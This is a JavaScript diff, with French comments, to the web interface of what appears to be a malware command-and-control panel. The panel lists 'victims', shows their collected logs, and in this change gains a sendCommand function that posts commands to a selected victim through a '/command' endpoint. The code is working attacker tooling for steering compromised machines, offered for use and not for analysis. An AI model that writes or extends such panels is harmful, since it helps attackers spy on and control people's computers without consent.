@@ -92,6 +92,9 @@ function selectVictim(victimId) {
     });
     document.querySelector(`.victim-item[onclick*="${victimId}"]`)?.classList.add('active');
     
+    // Afficher la section des commandes
+    document.getElementById('commands-section').style.display = 'block';
+    
     // Charger les logs
     loadVictimLogs();
 }
@@ -103,10 +106,14 @@ async function loadVictimLogs() {
     if (!victimId) {
         document.getElementById('logs-display').innerHTML = 
             '<p class="text-muted text-center">Sélectionnez une victime pour voir les logs</p>';
+        document.getElementById('commands-section').style.display = 'none';
         return;
     }
     
     currentVictimId = victimId;
+    
+    // Afficher la section des commandes
+    document.getElementById('commands-section').style.display = 'block';
     
     try {
         const response = await fetch(`/victims/${victimId}/logs`);
@@ -319,5 +326,42 @@ function escapeHtml(text) {
     const div = document.createElement('div');
     div.textContent = text;
     return div.innerHTML;
+}
+
+// Envoyer une commande à la victime sélectionnée
+async function sendCommand(command, params = {}) {
+    const victimId = document.getElementById('victim-select').value || currentVictimId;
+    
+    if (!victimId) {
+        alert('Veuillez sélectionner une victime');
+        return;
+    }
+    
+    try {
+        const response = await fetch('/command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                victim_id: victimId,
+                command: command,
+                params: params
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (response.status === 200) {
+            alert(`✅ Commande '${command}' envoyée avec succès`);
+            console.log('Commande envoyée:', data);
+        } else {
+            alert(`❌ Erreur: ${data.error || 'Erreur inconnue'}`);
+        }
+        
+    } catch (error) {
+        console.error('Erreur lors de l\'envoi de la commande:', error);
+        alert('❌ Erreur de connexion lors de l\'envoi de la commande');
+    }
 }
 
